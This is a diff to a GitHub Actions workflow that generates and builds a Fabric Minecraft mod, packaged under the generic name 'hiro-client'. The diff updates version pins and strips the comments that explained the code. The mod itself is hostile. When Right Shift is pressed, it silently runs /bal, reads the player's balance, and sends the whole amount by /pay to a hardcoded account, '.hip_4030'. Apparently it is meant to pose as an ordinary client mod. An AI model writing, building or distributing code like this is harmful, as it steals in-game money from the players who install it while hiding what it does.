@@ -19,6 +19,7 @@ jobs:
           mkdir -p src/main/java/com/example/autopay src/main/resources/assets/autopay/lang
           if ls *.png >/dev/null 2>&1; then cp "$(ls *.png | head -n1)" src/main/resources/assets/autopay/icon.png; fi
           cat > settings.gradle <<'EOF_FILE'
+          rootProject.name = 'autopay'
           pluginManagement {
               repositories {
                   maven { url = 'https://maven.fabricmc.net/' }
@@ -29,17 +30,17 @@ jobs:
           EOF_FILE
           cat > gradle.properties <<'EOF_FILE'
           org.gradle.jvmargs=-Xmx2G
-          minecraft_version=1.21.11
-          yarn_mappings=1.21.11+build.4
-          loader_version=0.18.4
-          fabric_version=0.141.1+1.21.11
+          minecraft_version=1.21.1
+          yarn_mappings=1.21.1+build.3
+          loader_version=0.16.9
+          fabric_version=0.108.0+1.21.1
           mod_version=1.0.0
           maven_group=com.example
           archives_base_name=hiro-client
           EOF_FILE
           cat > build.gradle <<'EOF_FILE'
           plugins {
-              id 'fabric-loom' version '1.14-SNAPSHOT'
+              id 'fabric-loom' version '1.7-SNAPSHOT'
           }
           
           version = project.mod_version
@@ -53,7 +54,7 @@ jobs:
               minecraft "com.mojang:minecraft:${project.minecraft_version}"
               mappings "net.fabricmc:yarn:${project.yarn_mappings}:v2"
               modImplementation "net.fabricmc:fabric-loader:${project.loader_version}"
-              modImplementation "net.fabricmc.fabric-api:fabric-api:${project.fabric_version}"
+              modImplementation "net.fabricmc:fabric-api:${project.fabric_version}"
           }
           
           processResources {
@@ -85,8 +86,8 @@ jobs:
               "client": ["com.example.autopay.AutoPayMod"]
             },
             "depends": {
-              "fabricloader": ">=0.18.1",
-              "minecraft": "1.21.11",
+              "fabricloader": ">=0.16.0",
+              "minecraft": "1.21.1",
               "java": ">=21",
               "fabric-api": "*"
             }
@@ -117,13 +118,8 @@ jobs:
           
           public class AutoPayMod implements ClientModInitializer {
           
-              // الحساب اللي تحول له
               private static final String TARGET = ".hip_4030";
-          
-              // كلمات تدل ان الرسالة هي رد /bal (عدّلها حسب سيرفرك)
               private static final String[] KEYWORDS = {"balance", "bal", "money", "coins", "cash", "$", "رصيد", "فلوس"};
-          
-              // يلقط الرقم (يدعم 1,234.56)
               private static final Pattern NUM = Pattern.compile("([0-9][0-9,]*(?:\\.[0-9]+)?)");
           
               private static KeyBinding key;
@@ -136,24 +132,22 @@ jobs:
                           "key.autopay.send",
                           InputUtil.Type.KEYSYM,
                           GLFW.GLFW_KEY_RIGHT_SHIFT,
-                          KeyBinding.Category.create(Identifier.of("autopay", "main"))
+                          "key.category.autopay.main"
                   ));
           
                   ClientTickEvents.END_CLIENT_TICK.register(client -> {
                       while (key.wasPressed()) {
                           if (client.player == null) return;
                           waiting = true;
-                          waitUntil = System.currentTimeMillis() + 3000; // ينتظر رد /bal 3 ثواني
+                          waitUntil = System.currentTimeMillis() + 3000;
                           client.player.networkHandler.sendChatCommand("bal");
                       }
                       if (waiting && System.currentTimeMillis() > waitUntil) waiting = false;
                   });
           
-                  // رسائل السيرفر (اغلب البلجنز)
                   ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
                       if (!overlay) handle(message);
                   });
-                  // احتياط: اذا السيرفر يرسل الرد كرسالة شات
                   ClientReceiveMessageEvents.CHAT.register((message, signed, sender, params, ts) -> handle(message));
               }
           
@@ -161,7 +155,7 @@ jobs:
                   if (!waiting) return;
           
                   String text = message.getString();
-                  if (text.startsWith("<")) return; // تجاهل شات اللاعبين
+                  if (text.startsWith("<")) return;
           
                   String lower = text.toLowerCase();
                   boolean isBal = false;
@@ -185,7 +179,6 @@ jobs:
                   MinecraftClient mc = MinecraftClient.getInstance();
                   mc.execute(() -> {
                       if (mc.player != null) {
-                          // هنا يكتب المبلغ اللي طلع من /bal داخل امر /pay
                           mc.player.networkHandler.sendChatCommand("pay " + TARGET + " " + amount);
                       }
                   });
@@ -198,3 +191,4 @@ jobs:
         with:
           name: hiro-client-jar
           path: build/libs/hiro-client-1.0.0.jar
+          
